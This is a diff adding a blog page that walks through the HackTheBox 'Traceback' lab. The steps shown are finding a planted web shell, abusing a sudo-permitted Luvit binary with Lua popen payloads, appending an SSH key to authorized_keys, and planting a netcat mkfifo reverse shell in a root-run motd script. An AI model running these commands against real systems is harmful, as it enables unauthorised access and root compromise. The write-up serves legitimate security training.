@@ -1,0 +1,70 @@
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/_next/static/css/612a222fb0c8327bc985.css" as="style"/><link rel="stylesheet" href="/_next/static/css/612a222fb0c8327bc985.css" data-n-g=""/><link rel="preload" href="/_next/static/css/670b2ba76521e264e24c.css" as="style"/><link rel="stylesheet" href="/_next/static/css/670b2ba76521e264e24c.css" data-n-p=""/><noscript data-n-css=""></noscript><link rel="preload" href="/_next/static/chunks/main-716454fbc5f967e07bd2.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.cdbdac0a36200f52203c.js" as="script"/><link rel="preload" href="/_next/static/chunks/99f422a92ff7083adb8a7d840734144fa7589f68.7cc229cc9d165929cc42.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-bffba6408cd4aa04210c.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/blog/traceback-c79736346ff02393307c.js" as="script"/></head><body><div id="__next"><div class="post_post__1Lsln"><h1>Traceback (HackTheBox)</h1><h6>August 19, 2020</h6><p>Started the box by enumerating services on the machine using nmap. Nmap scan returned http and ssh services which weren&#x27;t that interesting.</p><div class="post_codeblock__jpvW3"><pre><code># Nmap 7.80 scan initiated Wed May 20 06:40:09 2020 as: nmap -sV -sT -oN nmap 10.10.10.181
+Nmap scan report for 10.10.10.181
+Host is up (0.094s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed May 20 06:40:21 2020 -- 1 IP address (1 host up) scanned in 11.59 seconds
+</code></pre></div><p>Going to <a href="http://10.10.10.181">http://10.10.10.181</a>, the website had already been owned by Xh4H and the hacker claims to have left a backdoor somewhere.</p><p>Running directory bruteforcing using Daniel Miessler&#x27;s wordlists returned zero results. However, upon checking the page source, there&#x27;s a comment saying &quot;Some of the best web shells that you might need&quot;.
+Throwing that string into Google took me to a Github repo <a href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a>.</p><p>Going through the list of backdoors, <a href="http://10.10.10.181/smevk.php">http://10.10.10.181/smevk.php</a> returned a <code>HTTP 200 OK</code>. Using the default credentials <code>admin:admin</code>, I was able to gain access to the webshell.
+The webshell&#x27;s interface was really ugly, but it was sufficient to do some basic enumeration.</p><div class="post_codeblock__jpvW3"><pre><code># Determine user
+$ whoami
+webadmin
+
+# Check home directory
+$ ls -a /home/webadmin
+. .. .bash_history .bash_logout .bashrc .cache .local .luvit_history .profile .ssh note.txt
+
+# Read note.txt
+$ cat /home/webadmin/note.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I&#x27;m sure you know where to find it.
+Contact me if you have any question.
+
+# List user privileges
+$ sudo -l
+Matching Defaults entries for webadmin on traceback:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on traceback:
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+</code></pre></div><p>Looking through the results, it seems <code>/home/sysadmin/luvit</code> can be executed as the user <code>sysadmin</code> without authentication.</p><p>I had never written a single line of Lua code before and after doing some googling it seems that Luvit is a runtime environment for Lua.
+Reading through the documentation I tried to craft some lua payload which will be executed as <code>sysadmin</code>.</p><p>The following lua code lists files in <code>/home/sysadmin</code></p><div class="post_codeblock__jpvW3"><pre><code>directory=&#x27;/home/sysadmin/&#x27;
+pfile = io.popen(&#x27;ls -a &quot;&#x27;..directory..&#x27;&quot;&#x27;)
+for filename in pfile:lines() do
+    print(filename)
+end
+</code></pre></div><p>To execute this piece of code, I simply had to write this code somewhere on the box and run it using luvit. To do so, I echoed my code to <code>/tmp/</code> on the box and ran it.</p><div class="post_codeblock__jpvW3"><pre><code>$ echo &quot;directory=&#x27;/home/sysadmin/&#x27;;pfile = io.popen(&#x27;ls -a \\&quot;&#x27;..directory..&#x27;\\&quot;&#x27;);for filename in pfile:lines() do;print(filename);end&quot; &gt; /tmp/listdir.lua
+
+$ sudo -u sysadmin /home/sysadmin/luvit /tmp/listdir.lua
+. .. .bash_history .bash_logout .bashrc .cache .local .profile .ssh luvit user.txt
+
+</code></pre></div><p>Modifying the payload to print <code>/home/sysadmin/user.txt</code>, I got my first flag.</p><div class="post_codeblock__jpvW3"><pre><code>$ echo &quot;pfile = io.popen(&#x27;cat /home/sysadmin/user.txt&#x27;);for filename in pfile:lines() do;print(filename);end&quot; &gt; /tmp/getflag.lua
+
+$ sudo -u sysadmin /home/sysadmin/luvit /tmp/getflag.lua
+{{FLAG}}
+
+</code></pre></div><p>Enumerating through sysadmin&#x27;s home folder, I found the <code>.ssh</code> folder with the <code>authorized_keys</code> file. Adding my public key to this file should grant me ssh access as sysadmin to the box.
+Using <code>ssh-keygen</code>, I created a new ssh keypair. The payload adds my public key to the list of authorized keys. </p><div class="post_codeblock__jpvW3"><pre><code>$ echo &quot;io.popen(\\&quot;echo &#x27;{{PUBLIC KEY}}&#x27; &gt;&gt; /home/sysadmin/.ssh/authorized_keys\\&quot;)&quot; &gt; /tmp/ssh.lua
+
+$ sudo -u sysadmin /home/sysadmin/luvit /tmp/ssh.lua
+</code></pre></div><p>Ssh-ed into the box using <code>ssh -i PRIVATE_KEY <a href="mailto:sysadmin@10.10.10.181">sysadmin@10.10.10.181</a></code> and I was greeted by a message from Xh4h and a shell.</p><div class="post_codeblock__jpvW3"><pre><code>➜  ~ ssh -i PRIVATE_KEY sysadmin@10.10.10.181
+#################################
+-------- OWNED BY XH4H  ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+
+Welcome to Xh4H land 
+
+$
+</code></pre></div><p>Trying to privilege escalate from sysadmin to root was kinda tricky. I tried looking for files with incorrect permisions or suid binaries but found nothing. However looking through the list of processes using <code>ps -aux</code>, there was a command being executed as root that seemed to be running at intervals.</p><div class="post_codeblock__jpvW3"><pre><code>root       3851  0.0  0.0   4628   772 ?        Ss   19:15   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+</code></pre></div><p>The command seems to be restoring a backup of the message of the day (motd), which is a service that can be used to print custom greeting messages upon login - similar to the greeting from Xh4h upon ssh-ing into the box.</p><p>Looking through <code>/etc/update-motd.d/</code>, there were several messages and the first one <code>/etc/update-motd.d/00-header</code> contained <code>echo &quot;\nWelcome to Xh4H land \n&quot;</code>, which was the greeting upon logging into the box. This could be abused by adding commands to run upon login, which will be run as root.</p><p>I set up a reverse shell listener on port 1337 on my local machine. Afterwards, I edited <code>/etc/update-motd.d/00-header</code> to set up a netcat reverse shell connector. </p><div class="post_codeblock__jpvW3"><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc {{ipaddr}} 1337 &gt;/tmp/f; echo &quot;\nWelcome to Xh4Hland \n&quot;
+</code></pre></div><p>In a different window, ssh into the box and monitor the reverse shell listener. Note that it may require a few tries since the motd gets overwritten every 30 seconds. If timed correctly you should have access to the root shell. Navigate to <code>/root</code> to grab the root flag.</p><div class="post_codeblock__jpvW3"><pre><code>$ cat /root/root.txt
+{{FLAG}}
+
+</code></pre></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/blog/traceback","query":{},"buildId":"3LkWVrF5Wd0TevBs6KKBj","nextExport":true,"autoExport":true,"isFallback":false}</script><script nomodule="" src="/_next/static/chunks/polyfills-83732ebf2ed7f8a1b2c7.js"></script><script src="/_next/static/chunks/main-716454fbc5f967e07bd2.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.cdbdac0a36200f52203c.js" async=""></script><script src="/_next/static/chunks/99f422a92ff7083adb8a7d840734144fa7589f68.7cc229cc9d165929cc42.js" async=""></script><script src="/_next/static/chunks/pages/_app-bffba6408cd4aa04210c.js" async=""></script><script src="/_next/static/chunks/pages/blog/traceback-c79736346ff02393307c.js" async=""></script><script src="/_next/static/3LkWVrF5Wd0TevBs6KKBj/_buildManifest.js" async=""></script><script src="/_next/static/3LkWVrF5Wd0TevBs6KKBj/_ssgManifest.js" async=""></script></body></html>
